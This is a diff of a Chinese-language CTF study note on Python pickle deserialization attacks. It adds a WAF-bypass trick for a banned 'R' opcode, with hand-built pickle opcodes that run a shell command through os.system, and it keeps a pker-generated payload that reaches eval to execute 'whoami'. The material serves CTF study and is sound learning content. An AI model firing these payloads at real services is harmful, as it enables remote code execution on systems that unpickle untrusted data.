@@ -9,22 +9,35 @@ tags:: CTF/Python
 		- 类型字面量构造
 		- list 和 dict 成员修改
 		- 对象成员变量修改
+- # 绕WAF
+	- 字母`R`被禁用
+		- ```python
+		  import pickle
+		  import pickletools
+		  
+		  opcode=b'''(cos
+		  system
+		  S'bash -c "sleep 1"'
+		  o.'''
+		  pickletools.dis(opcode)
+		  pickle.loads(opcode)
+		  ```
 	- 可以用[这个工具](https://github.com/EddieIvan01/pker)生成
-	- ```shell
-	  $ cat test/code_breaking
-	  getattr = GLOBAL('builtins', 'getattr')
-	  dict = GLOBAL('builtins', 'dict')
-	  dict_get = getattr(dict, 'get')
-	  globals = GLOBAL('builtins', 'globals')
-	  builtins = globals()
-	  __builtins__ = dict_get(builtins, '__builtins__')
-	  eval = getattr(__builtins__, 'eval')
-	  eval('__import__("os").system("whoami")')
-	  return
-	  
-	  $ python3 pker.py < test/code_breaking
-	  b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\'__builtins__\'\ntRp5\n0g0\n(g5\nS\'eval\'\ntRp6\n0g6\n(S\'__import__("os").system("whoami")\'\ntR.'
-	  ```
+		- ```shell
+		  $ cat test/code_breaking
+		  getattr = GLOBAL('builtins', 'getattr')
+		  dict = GLOBAL('builtins', 'dict')
+		  dict_get = getattr(dict, 'get')
+		  globals = GLOBAL('builtins', 'globals')
+		  builtins = globals()
+		  __builtins__ = dict_get(builtins, '__builtins__')
+		  eval = getattr(__builtins__, 'eval')
+		  eval('__import__("os").system("whoami")')
+		  return
+		  
+		  $ python3 pker.py < test/code_breaking
+		  b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\'__builtins__\'\ntRp5\n0g0\n(g5\nS\'eval\'\ntRp6\n0g6\n(S\'__import__("os").system("whoami")\'\ntR.'
+		  ```
 - # Pickle文件OPCODE分析
 	- `python -m pickletools pickle.pkl`
 - # 基础
